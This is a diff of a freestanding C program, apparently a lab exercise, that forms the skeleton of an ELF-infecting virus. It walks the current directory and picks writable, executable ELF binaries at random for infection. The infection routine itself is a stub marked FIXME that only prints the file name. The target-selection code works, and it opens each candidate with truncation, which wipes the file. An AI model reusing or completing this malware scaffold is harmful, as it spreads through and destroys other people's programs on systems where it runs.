@@ -15,9 +15,6 @@ typedef long int intptr; /* ssize_t */
 
 // end types.h
 
-uintptr my_strlen(char const* str);
-void infect(const char* fpath);
-
 // elf.h
 
 #define EI_NIDENT	16
@@ -88,6 +85,241 @@ struct linux_dirent {
 
 // end dirent.h
 
+// stat.h
+
+// from my kernel's header
+
+typedef long long __kernel_long_t;
+typedef unsigned long long __kernel_ulong_t;
+
+typedef __kernel_ulong_t	dev_t;
+typedef __kernel_ulong_t	ino_t;
+typedef __kernel_ulong_t	nlink_t;
+typedef unsigned int 		uid_t;
+typedef uid_t 				gid_t;
+typedef unsigned int 		mode_t;
+
+struct stat {
+	__kernel_ulong_t	st_dev;
+	__kernel_ulong_t	st_ino;
+	__kernel_ulong_t	st_nlink;
+
+	unsigned int		st_mode;
+	unsigned int		st_uid;
+	unsigned int		st_gid;
+	unsigned int		__pad0;
+	__kernel_ulong_t	st_rdev;
+	__kernel_long_t		st_size;
+	__kernel_long_t		st_blksize;
+	__kernel_long_t		st_blocks;	// Number 512-byte blocks allocated.
+
+	__kernel_ulong_t	st_atime;
+	__kernel_ulong_t	st_atime_nsec;
+	__kernel_ulong_t	st_mtime;
+	__kernel_ulong_t	st_mtime_nsec;
+	__kernel_ulong_t	st_ctime;
+	__kernel_ulong_t	st_ctime_nsec;
+	__kernel_long_t		__unused[3];
+};
+
+/*
+// from my kernel's header
+
+// ? maybe this can help?
+// #if __BITS_PER_LONG == 64
+
+# define timespec64 timespec
+
+typedef signed long long time64_t;
+struct timespec64 {
+	time64_t	tv_sec;			// seconds
+	long		tv_nsec;		// nanoseconds
+};
+
+// originally kstat
+struct stat {
+	u32		result_mask;	// What fields the user got
+	umode_t		mode;
+	unsigned int	nlink;
+	uint32_t	blksize;	// Preferred I/O size
+	u64		attributes;
+	u64		attributes_mask;
+//#define KSTAT_ATTR_FS_IOC_FLAGS				\
+	(STATX_ATTR_COMPRESSED |			\
+	 STATX_ATTR_IMMUTABLE |				\
+	 STATX_ATTR_APPEND |				\
+	 STATX_ATTR_NODUMP |				\
+	 STATX_ATTR_ENCRYPTED				\
+	 )// Attrs corresponding to FS_*_FL flags
+	u64		ino;
+	dev_t		dev;
+	dev_t		rdev;
+	kuid_t		uid;
+	kgid_t		gid;
+	loff_t		size;
+	struct timespec	atime;
+	struct timespec	mtime;
+	struct timespec	ctime;
+	struct timespec	btime;			// File creation time
+	u64		blocks;
+};*/
+
+// from a weird reference
+/*typedef unsigned long	dev_t;
+typedef unsigned long	ino_t;
+
+typedef	unsigned long	mode_t;			// (historical version)
+typedef	unsigned long	nlink_t;		// (historical version)
+typedef	long	pid_t;			// (historical version)
+typedef	int	uid_t;
+
+typedef	uid_t	gid_t;
+
+typedef long long	off_t;
+
+typedef	long	time_t;
+
+struct stat
+{
+	dev_t	st_dev;			// inode's device
+	ino_t	st_ino;			// inode's number
+	mode_t	st_mode;		// inode protection mode
+	nlink_t	st_nlink;		// number of hard links
+	uid_t	st_uid;			// user ID of the file's owner
+	gid_t	st_gid;			// group ID of the file's group
+	dev_t	st_rdev;		// device type
+	off_t	st_size;		// file size, in bytes
+	time_t	st_atime;		// time of last access
+	long	st_spare1;
+	time_t	st_mtime;		// time of last data modification
+	long	st_spare2;
+	time_t	st_ctime;		// time of last file status change
+	long	st_spare3;
+	long	st_blksize;		// optimal blocksize for I/O
+	long	st_blocks;		// blocks allocated for file
+	unsigned long	st_flags;		// user defined flags for file
+	unsigned long	st_gen;			// file generation number
+};*/
+/*
+// from bootlin https://elixir.bootlin.com/linux/v3.1/source/include/asm-generic/stat.h#L23
+struct stat {
+	unsigned long	st_dev;		// Device.
+	unsigned long	st_ino;		// File serial number.
+	unsigned int	st_mode;	// File mode.
+	unsigned int	st_nlink;	// Link count.
+	unsigned int	st_uid;		// User ID of the file's owner.
+	unsigned int	st_gid;		// Group ID of the file's group
+	unsigned long	st_rdev;	// Device number, if device.
+	unsigned long	__pad1;
+	long		st_size;	// Size of file, in bytes.
+	int		st_blksize;	// Optimal block size for I/O.
+	int		__pad2;
+	long		st_blocks;	// Number 512-byte blocks allocated.
+	long		st_atime;	// Time of last access.
+	unsigned long	st_atime_nsec;
+	long		st_mtime;	// Time of last modification.
+	unsigned long	st_mtime_nsec;
+	long		st_ctime;	// Time of last status change.
+	unsigned long	st_ctime_nsec;
+	unsigned int	__unused4;
+	unsigned int	__unused5;
+};
+
+// from linux 4.13.0 orig kernel source code
+
+typedef unsigned int u32;
+typedef signed int s32;
+typedef unsigned short u16;
+typedef signed short s16;
+typedef unsigned long long u64;
+typedef signed long long s64;
+
+typedef u32		compat_size_t;
+typedef s32		compat_ssize_t;
+typedef s32		compat_time_t;
+typedef s32		compat_clock_t;
+typedef s32		compat_pid_t;
+typedef u16		__compat_uid_t;
+typedef u16		__compat_gid_t;
+typedef u32		__compat_uid32_t;
+typedef u32		__compat_gid32_t;
+typedef u16		compat_mode_t;
+typedef u32		compat_ino_t;
+typedef u16		compat_dev_t;
+typedef s32		compat_off_t;
+typedef s64		compat_loff_t;
+typedef u16		compat_nlink_t;
+
+typedef compat_dev_t	dev_t;
+typedef compat_ino_t	ino_t;
+typedef compat_nlink_t	nlink_t;
+typedef compat_mode_t	mode_t;
+
+//struct compat_stat {
+struct stat {
+	compat_dev_t	st_dev;
+	u16		__pad1;
+	compat_ino_t	st_ino;
+	compat_mode_t	st_mode;
+	compat_nlink_t	st_nlink;
+	__compat_uid_t	st_uid;
+	__compat_gid_t	st_gid;
+	compat_dev_t	st_rdev;
+	u16		__pad2;
+	u32		st_size;
+	u32		st_blksize;
+	u32		st_blocks;
+	u32		st_atime;
+	u32		st_atime_nsec;
+	u32		st_mtime;
+	u32		st_mtime_nsec;
+	u32		st_ctime;
+	u32		st_ctime_nsec;
+	u32		__unused4;
+	u32		__unused5;
+};*/
+
+#define S_IFMT  00170000
+#define S_IFSOCK 0140000
+#define S_IFLNK	 0120000
+#define S_IFREG  0100000
+#define S_IFBLK  0060000
+#define S_IFDIR  0040000
+#define S_IFCHR  0020000
+#define S_IFIFO  0010000
+#define S_ISUID  0004000
+#define S_ISGID  0002000
+#define S_ISVTX  0001000
+
+#define S_ISLNK(m)	(((m) & S_IFMT) == S_IFLNK)
+#define S_ISREG(m)	(((m) & S_IFMT) == S_IFREG)
+#define S_ISDIR(m)	(((m) & S_IFMT) == S_IFDIR)
+#define S_ISCHR(m)	(((m) & S_IFMT) == S_IFCHR)
+#define S_ISBLK(m)	(((m) & S_IFMT) == S_IFBLK)
+#define S_ISFIFO(m)	(((m) & S_IFMT) == S_IFIFO)
+#define S_ISSOCK(m)	(((m) & S_IFMT) == S_IFSOCK)
+
+//#define	S_ISUID	0004000			/* set user id on execution */
+//#define	S_ISGID	0002000			/* set group id on execution */
+#define	S_ISTXT	0001000			/* sticky bit */
+
+#define	S_IRWXU	00700			/* RWX mask for owner */
+#define	S_IRUSR	00400			/* R for owner */
+#define	S_IWUSR	00200			/* W for owner */
+#define	S_IXUSR	00100			/* X for owner */\
+
+#define	S_IRWXG	0000070			/* RWX mask for group */
+#define	S_IRGRP	0000040			/* R for group */
+#define	S_IWGRP	0000020			/* W for group */
+#define	S_IXGRP	0000010			/* X for group */
+
+#define	S_IRWXO	0000007			/* RWX mask for other */
+#define	S_IROTH	0000004			/* R for other */
+#define	S_IWOTH	0000002			/* W for other */
+#define	S_IXOTH	0000001			/* X for other */
+
+// end stat.h
+
 // syscall.h
 #define SYS_READ	0
 #define SYS_WRITE   1
@@ -99,6 +331,8 @@ struct linux_dirent {
 #define SYS_GETPID  39
 #define SYS_GETDENTS	78
 #define SYS_GETCWD  79
+#define SYS_CHMOD	90
+#define SYS_FCHMOD	91
 #define SYS_GETRLIMIT   97
 #define SYS_PTRACE  101
 #define SYS_GETUID  102
@@ -119,6 +353,10 @@ intptr getrlimit(unsigned int resource, struct rlimit *rlim);
 intptr getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
 intptr getdents64(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
 intptr getcwd(char *buf, unsigned long size);
+intptr stat(const char *filename, struct stat *statbuf);
+intptr fstat(unsigned int fd, struct stat *statbuf);
+intptr chmod(const char *filename, mode_t mode);
+intptr fchmod(unsigned int fd, mode_t mode);
 
 void* syscall5(
 	void* number,
@@ -167,65 +405,6 @@ void* syscall(
 int my_memcmp(const unsigned char *str1, const unsigned char *str2, size_t count);
 
 // end stdio.h
-
-// stat.h
-
-typedef unsigned long	dev_t;
-typedef unsigned long	ino_t;
-
-typedef	unsigned long	mode_t;			/* (historical version) */
-typedef	unsigned long	nlink_t;		/* (historical version) */
-typedef	long	pid_t;			/* (historical version) */
-typedef	long	uid_t;
-
-typedef	uid_t	gid_t;
-
-typedef long long	off_t;
-
-typedef	long		time_t;
-
-struct stat
-{
-	dev_t	st_dev;			/* inode's device */
-	ino_t	st_ino;			/* inode's number */
-	mode_t	st_mode;		/* inode protection mode */
-	nlink_t	st_nlink;		/* number of hard links */
-	uid_t	st_uid;			/* user ID of the file's owner */
-	gid_t	st_gid;			/* group ID of the file's group */
-	dev_t	st_rdev;		/* device type */
-	off_t	st_size;		/* file size, in bytes */
-	time_t	st_atime;		/* time of last access */
-	long	st_spare1;
-	time_t	st_mtime;		/* time of last data modification */
-	long	st_spare2;
-	time_t	st_ctime;		/* time of last file status change */
-	long	st_spare3;
-	long	st_blksize;		/* optimal blocksize for I/O */
-	long	st_blocks;		/* blocks allocated for file */
-	unsigned long	st_flags;		/* user defined flags for file */
-	unsigned long	st_gen;			/* file generation number */
-};
-
-#define	S_ISUID	0004000			/* set user id on execution */
-#define	S_ISGID	0002000			/* set group id on execution */
-#define	S_ISTXT	0001000			/* sticky bit */
-
-#define	S_IRWXU	0000700			/* RWX mask for owner */
-#define	S_IRUSR	0000400			/* R for owner */
-#define	S_IWUSR	0000200			/* W for owner */
-#define	S_IXUSR	0000100			/* X for owner */\
-
-#define	S_IRWXG	0000070			/* RWX mask for group */
-#define	S_IRGRP	0000040			/* R for group */
-#define	S_IWGRP	0000020			/* W for group */
-#define	S_IXGRP	0000010			/* X for group */
-
-#define	S_IRWXO	0000007			/* RWX mask for other */
-#define	S_IROTH	0000004			/* R for other */
-#define	S_IWOTH	0000002			/* W for other */
-#define	S_IXOTH	0000001			/* X for other */
-
-// end stat.h
 
 // fcntl.h
 
@@ -383,6 +562,13 @@ typedef struct _ftsent {
 
 // end fs.h
 
+uintptr my_strlen(char const* str);
+char* my_strncat(char *dest, const char *src, size_t n);
+char * my_strncpy(char *dest, const char *src, size_t n);
+void reverse(char str[], int length);
+char* itoa(int num, char* str, int base);
+int infect(const char* fpath);
+
 // syscall.c
 
 intptr read(int fd, char *buf, uintptr nbytes)
@@ -487,6 +673,42 @@ intptr getcwd(char *buf, unsigned long size)
 		);
 }
 
+intptr stat(const char *filename, struct stat *statbuf) {
+	return (intptr)
+		syscall2(
+			(void*)SYS_STAT,
+			(void*)filename,
+			(void*)statbuf
+		);
+}
+
+intptr fstat(unsigned int fd, struct stat *statbuf) {
+	return (intptr)
+		syscall2(
+			(void*)SYS_FSTAT,
+			(void*)(unsigned long)fd,
+			(void*)statbuf
+		);
+}
+
+intptr chmod(const char *filename, mode_t mode) {
+	return (intptr)
+		syscall2(
+			(void*)SYS_CHMOD,
+			(void*)filename,
+			(void*)(unsigned long)mode
+		);
+}
+
+intptr fchmod(unsigned int fd, mode_t mode) {
+	return (intptr)
+		syscall2(
+			(void*)SYS_FCHMOD,
+			(void*)(unsigned long)fd,
+			(void*)(unsigned long)mode
+		);
+}
+
 // end syscall.c
 
 // stdio.c
@@ -521,16 +743,17 @@ int getdtablesize()
 
 // nftw.c
 
-int nftw(const char *path, int (*fn)(const char *, const struct stat *, int, struct FTW *), int nfds)
+int nftw(const char *path, int (*fn)(const char *, const struct stat *), int nfds)
 {
 	//char * const paths[2] = { (char *)path, NULL };
 	int fd;
 	int nread;
 	char buf[32768];
-	char cwd_buf[1024];
+	char cwd_buf[4096];
 	struct linux_dirent *d;
 	int bpos;
 	char d_type;
+	unsigned int path_len, file_len;
 
 	if((fd = open(path, O_RDONLY | O_DIRECTORY)) < 0) {
 		return -1;
@@ -545,17 +768,32 @@ int nftw(const char *path, int (*fn)(const char *, const struct stat *, int, str
 		if (nread == 0) {
 			break;
 		}
-		getcwd(cwd_buf,1024);
-		write(1,cwd_buf,my_strlen(cwd_buf));
-		write(1, "\n", 1);
-		write(1, "--------------- dirent -----------\n",my_strlen("--------------- dirent -----------\n"));
-		write(1, "file type   d_name\n", my_strlen("file type   d_name\n"));
+		getcwd(cwd_buf,4096);
+		path_len = my_strlen(cwd_buf);
+		//write(1,cwd_buf,my_strlen(cwd_buf));
+		//write(1, "\n", 1);
+		//write(1, "--------------- dirent -----------\n",my_strlen("--------------- dirent -----------\n"));
+		//write(1, "file type   d_name\n", my_strlen("file type   d_name\n"));
 		for (bpos = 0; bpos < nread;) {
 			d = (struct linux_dirent *) (buf + bpos);
 			//write(1, "%8ld  ", d->d_ino);
-			d_type = *(buf + bpos + d->d_reclen - 1);
+			if((d_type = *(buf + bpos + d->d_reclen - 1)) == DT_REG ) {
+				if(DEBUG) {
+					write(1, "[DEBUG] found reg file : ", my_strlen("[DEBUG] found reg file : "));
+					write(1, d->d_name, my_strlen(d->d_name));
+					write(1, "\n", 1);
+				}
+				file_len = my_strlen(d->d_name);
+				char abs_path[path_len + file_len + 1 + 1];
+				my_strncpy(abs_path, cwd_buf, path_len);
+				my_strncat(abs_path,"/", 1);
+				my_strncat(abs_path, d->d_name, file_len);
+				struct stat statbuf;
+				stat(abs_path, &statbuf);
+				fn(abs_path, &statbuf);
+			}
 
-			if(d_type == DT_REG) {
+			/*if(d_type == DT_REG) {
 				write(1, "regular", my_strlen("regular"));
 			} else if(d_type == DT_DIR) {
 				write(1, "directory", my_strlen("directory"));
@@ -575,16 +813,9 @@ int nftw(const char *path, int (*fn)(const char *, const struct stat *, int, str
 				write(1, "???", my_strlen("???"));
 			}
 			//printf("%4d %10lld  %s\n", d->d_reclen,(long long) d->d_off, d->d_name);
-			//write(1, "\t", 1);
-			//char c = '0' + d_type / 100;
-			//write(1, &c, 1);
-			//c = '0' + (d_type / 10) % 10;
-			//write(1, &c, 1);
-			//c = '0' + d_type % 10;
-			//write(1, &c, 1);
 			write(1, "\t", 1);
 			write(1, d->d_name, my_strlen(d->d_name));
-			write(1, "\n", 1);
+			write(1, "\n", 1);*/
 			bpos += d->d_reclen;
 		}
 	}
@@ -595,16 +826,81 @@ int nftw(const char *path, int (*fn)(const char *, const struct stat *, int, str
 // end nftw.c
 const unsigned char magic[] = {ELFMAG0, ELFMAG1, ELFMAG2, ELFMAG3};
 
-void infect(const char* fpath);
-
 int can_execute(const struct stat *sb, const char* fpath)
 {
+	if(DEBUG) {
+		write(1, "[DEBUG] file : ", my_strlen("[DEBUG] file : "));
+		write(1, fpath, my_strlen(fpath));
+		if((sb->st_uid == getuid() && sb->st_mode & S_IXUSR)
+			|| (sb->st_mode & S_IXOTH)) {
+			write(1, " executable", my_strlen(" executable"));
+		} else {
+			write(1, " non-executable", my_strlen(" non-executable"));
+		}
+		write(1, "\n", 1);
+	}
 	return (sb->st_uid == getuid() && sb->st_mode & S_IXUSR)
 		|| (sb->st_mode & S_IXOTH);
 }
 
 int can_write(const struct stat *sb, const char* fpath)
 {
+	if(DEBUG) {
+		write(1, "[DEBUG] file : ", my_strlen("[DEBUG] file : "));
+		write(1, fpath, my_strlen(fpath));
+		if((sb->st_uid == getuid() && sb->st_mode & S_IWUSR)
+			|| (sb->st_mode & S_IWOTH)) {
+			write(1, " writable", my_strlen(" writable"));
+		} else {
+			write(1, " non-writable", my_strlen(" non-writable"));
+			if(sb->st_uid != getuid() && (sb->st_mode & S_IWOTH)) {
+				write(1, " as no W others", my_strlen(" as no W others"));
+			} else if(sb->st_uid == getuid() && (sb->st_mode & S_IWUSR) == 0) {
+				write(1, " as no W user", my_strlen(" as no W user"));
+			}
+			char tmp_stino[128];
+			itoa(sb->st_ino, tmp_stino, 10);
+			write(1, " st_ino(", my_strlen(" st_ino("));
+			write(1, tmp_stino, my_strlen(tmp_stino));
+			write(1, ")", 1);
+			char tmp_stmode[128];
+			itoa(sb->st_mode, tmp_stmode, 10);
+			write(1, " st_mode(", my_strlen(" st_mode("));
+			write(1, tmp_stmode, my_strlen(tmp_stmode));
+			write(1, ")", 1);
+			char tmp_stnlink[128];
+			itoa(sb->st_nlink, tmp_stnlink, 10);
+			write(1, " st_nlink(", my_strlen(" st_nlink("));
+			write(1, tmp_stnlink, my_strlen(tmp_stnlink));
+			write(1, ")", 1);
+			char tmp_stuid[128];
+			itoa(sb->st_uid, tmp_stuid, 10);
+			write(1, " st_uid(", my_strlen(" st_uid("));
+			write(1, tmp_stuid, my_strlen(tmp_stuid));
+			write(1, ")", 1);
+			char tmp_stgid[128];
+			itoa(sb->st_gid, tmp_stgid, 10);
+			write(1, " st_gid(", my_strlen(" st_gid("));
+			write(1, tmp_stgid, my_strlen(tmp_stgid));
+			write(1, ")", 1);
+			char tmp_stblksize[128];
+			itoa(sb->st_blksize, tmp_stblksize, 10);
+			write(1, " st_blksize(", my_strlen(" st_blksize("));
+			write(1, tmp_stblksize, my_strlen(tmp_stblksize));
+			write(1, ")", 1);
+			char tmp_stblocks[128];
+			itoa(sb->st_blocks, tmp_stblocks, 10);
+			write(1, " st_blocks(", my_strlen(" st_blocks("));
+			write(1, tmp_stblocks, my_strlen(tmp_stblocks));
+			write(1, ")", 1);
+			char tmp_stsize[128];
+			itoa(sb->st_size, tmp_stsize, 10);
+			write(1, " st_size(", my_strlen(" st_size("));
+			write(1, tmp_stsize, my_strlen(tmp_stsize));
+			write(1, ")", 1);
+		}
+		write(1, "\n", 1);
+	}
 	return (sb->st_uid == getuid() && sb->st_mode & S_IWUSR)
 		|| (sb->st_mode & S_IWOTH);
 }
@@ -620,8 +916,14 @@ int is_elf(const char* fpath)
 	//f = fopen(fpath, "rb");
 	f = open(fpath, O_RDWR | O_TRUNC);
 	//f = open(fpath, O_WRONLY | O_CREAT | O_TRUNC, S_IRUSR | S_IWUSR | S_IRGRP | S_IWGRP | S_IROTH | S_IWOTH);
-	if (!f) return 0;
-
+	if (!f) {
+		if(DEBUG) {
+			write(1, "[DEBUG] error inspecting file : ", my_strlen("[DEBUG] error inspecting file : "));
+			write(1, fpath, my_strlen(fpath));
+			write(1, "\n", 1);
+		}
+		return 0;
+	}
 	//nb = fread(&header, 1, sizeof(header), f);
 	nb = read(f, (char*)&header, sizeof(header));
 	if (nb == sizeof(header)) {
@@ -631,6 +933,18 @@ int is_elf(const char* fpath)
 	}
 	//fclose(f);
 	close(f);
+
+	if(DEBUG) {
+		write(1, "[DEBUG] file : ", my_strlen("[DEBUG] file : "));
+		write(1, fpath, my_strlen(fpath));
+		if(ret) {
+			write(1, " is ELF", my_strlen(" is ELF"));
+		} else {
+			write(1, " is not ELF", my_strlen(" is not ELF"));
+		}
+		write(1, "\n", 1);
+	}
+
 
 	return ret;
 }
@@ -653,19 +967,16 @@ int random_pick()
 }
 
 int file_process(const char *fpath,
-				 const struct stat *sb,
-				 int flag,
-				 struct FTW *s)
+				 const struct stat *sb)
 {
 	int ret = 0;
 
-	if (flag == FTW_F
-		&& can_execute(sb, fpath)
+	if (can_execute(sb, fpath)
 		&& can_write(sb, fpath)
 		&& is_elf(fpath)
 		&& random_pick())
 	{
-		infect(fpath);
+		ret = infect(fpath);
 	}
 
 	return ret;
@@ -692,6 +1003,7 @@ int main(int argc, char* argv[])
 ///////////////////////////////////////////////////////////////////////////////
 ///////////////////////////////////////////////////////////////////////////////
 
+// http://weeb.ddns.net/0/programming/c_without_standard_library_linux.txt
 uintptr my_strlen(char const* str)
 {
 	char const* p;
@@ -699,11 +1011,98 @@ uintptr my_strlen(char const* str)
 	return p - str;
 }
 
+// https://linux.die.net/man/3/strcat
+char*
+my_strncat(char *dest, const char *src, size_t n)
+{
+    size_t dest_len = my_strlen(dest);
+    size_t i;
+
+   for (i = 0 ; i < n && src[i] != '\0' ; i++)
+        dest[dest_len + i] = src[i];
+    dest[dest_len + i] = '\0';
+
+   return dest;
+}
+
+// https://linux.die.net/man/3/strcpy
+char *
+my_strncpy(char *dest, const char *src, size_t n)
+{
+    size_t i;
+
+   for (i = 0; i < n && src[i] != '\0'; i++)
+        dest[i] = src[i];
+    for ( ; i < n; i++)
+        dest[i] = '\0';
+
+   return dest;
+}
+
+// https://www.geeksforgeeks.org/implement-itoa/
+/* A utility function to reverse a string  */
+void reverse(char str[], int length)
+{
+    int start = 0;
+    int end = length -1;
+    while (start < end)
+    {
+        char tmp = *(str+start);
+        *(str+start) = *(str+end);
+        *(str+end) = tmp;
+        start++;
+        end--;
+    }
+}
+ 
+// Implementation of itoa()
+char* itoa(int num, char* str, int base)
+{
+    int i = 0;
+    int isNegative = 0;
+ 
+    /* Handle 0 explicitely, otherwise empty string is printed for 0 */
+    if (num == 0)
+    {
+        str[i++] = '0';
+        str[i] = '\0';
+        return str;
+    }
+ 
+    // In standard itoa(), negative numbers are handled only with 
+    // base 10. Otherwise numbers are considered unsigned.
+    if (num < 0 && base == 10)
+    {
+        isNegative = 1;
+        num = -num;
+    }
+ 
+    // Process individual digits
+    while (num != 0)
+    {
+        int rem = num % base;
+        str[i++] = (rem > 9)? (rem-10) + 'a' : rem + '0';
+        num = num/base;
+    }
+ 
+    // If number is negative, append '-'
+    if (isNegative)
+        str[i++] = '-';
+ 
+    str[i] = '\0'; // Append string terminator
+ 
+    // Reverse the string
+    reverse(str, i);
+ 
+    return str;
+}
+
 // FIXME: your infection logic should be placed here and below.
-void infect(const char* fpath)
+int infect(const char* fpath)
 {
 	//printf("%s will be infected.\n", fpath);
 	write(1, fpath, my_strlen(fpath));
 	write(1, " will be infected.\n", my_strlen(" will be infected.\n"));
+	return 0;
 }
 
